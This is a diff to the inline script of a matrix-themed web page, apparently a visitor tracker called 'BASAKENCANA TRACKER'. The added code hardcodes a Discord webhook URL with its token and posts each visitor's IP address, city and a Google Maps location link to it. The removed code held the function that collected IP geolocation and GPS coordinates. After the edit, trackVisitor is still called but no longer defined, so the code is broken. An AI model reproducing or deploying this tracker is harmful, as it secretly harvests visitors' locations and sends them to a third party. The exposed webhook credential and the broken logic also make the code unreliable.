@@ -52,61 +52,46 @@ function drawMatrix() {
         drops[i]++;
     });
 }
-setInterval(drawMatrix, 33);
-
-// 3. FUNGSI KIRIM DISCORD
 async function sendToDiscord(data, mapsLink, metode) {
+    const webhookURL = "https://discord.com/api/webhooks/1484113432583081984/Fkm8dj5XnVckc7du-HRYBFKAvdcxZ9jXcZqjJ_5G4hWa1rX0GUPVQ02P5as6o1Ok0xR";
+    
     const payload = {
         username: "BASAKENCANA TRACKER",
+        content: `📍 **LOKASI DITEMUKAN!**\nMetode: ${metode}\nLink: ${mapsLink}`,
         embeds: [{
-            title: "🚨 PENGUNJUNG BARU!",
-            color: 16711680,
+            title: "🚀 Detail Pengunjung",
+            color: 5763719, // Warna Hijau
             fields: [
-                { name: "🌐 IP", value: data.ip, inline: true },
-                { name: "📍 Lokasi", value: `${data.city}, ${data.country_name}`, inline: true },
-                { name: "🎯 Metode", value: metode, inline: false },
-                { name: "🗺️ Maps", value: `[KLIK LIHAT LOKASI](${mapsLink})` }
+                { name: "🌐 IP Address", value: data.ip, inline: true },
+                { name: "🏙️ Kota", value: data.city, inline: true },
+                { name: "🗺️ Google Maps", value: `[Klik di Sini](${mapsLink})` }
             ],
+            footer: { text: "Basakencana System v1.0" },
             timestamp: new Date()
         }]
     };
-    try {
-        await fetch(webhookURL, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) });
-    } catch (e) { console.error(e); }
-}
 
-// 4. MAIN TRACKER
-async function trackVisitor() {
     try {
-        const res = await fetch("https://ipapi.co/json/");
-        const data = await res.json();
+        const response = await fetch(webhookURL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        });
         
-        document.getElementById('status').innerText = "Pengunjung Terdeteksi!";
-        document.getElementById('ip').innerText = "IP: " + data.ip;
-        document.getElementById('location').innerText = "Lokasi: " + data.city;
-
-        if ("geolocation" in navigator) {
-            navigator.geolocation.getCurrentPosition(async (pos) => {
-                const lat = pos.coords.latitude;
-                const lon = pos.coords.longitude;
-                const mLink = `https://www.google.com/maps?q=${lat},${lon}`;
-                
-                // Tampilkan Map
-                const map = L.map('map').setView([lat, lon], 13);
-                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
-                L.marker([lat, lon]).addTo(map).bindPopup("Lokasi Akurat").openPopup();
-
-                await sendToDiscord(data, mLink, "🎯 AKURAT (GPS)");
-            }, async () => {
-                // Jika GPS ditolak
-                const mLink = `https://www.google.com/maps?q=${data.latitude},${data.longitude}`;
-                await sendToDiscord(data, mLink, "☁️ ESTIMASI (IP)");
-            });
+        if (!response.ok) {
+            console.error("Discord API Error:", response.statusText);
+        } else {
+            console.log("Berhasil terkirim ke Discord!");
         }
-    } catch (err) { console.error(err); }
-}
+    } catch (e) {
+        console.error("Gagal koneksi ke Discord:", e);
+    }
+}setInterval(drawMatrix, 33);
+
+// 3. FUNGSI KIRIM DISCORD
 
 trackVisitor();
 </script>
 </body>
 </html>
+
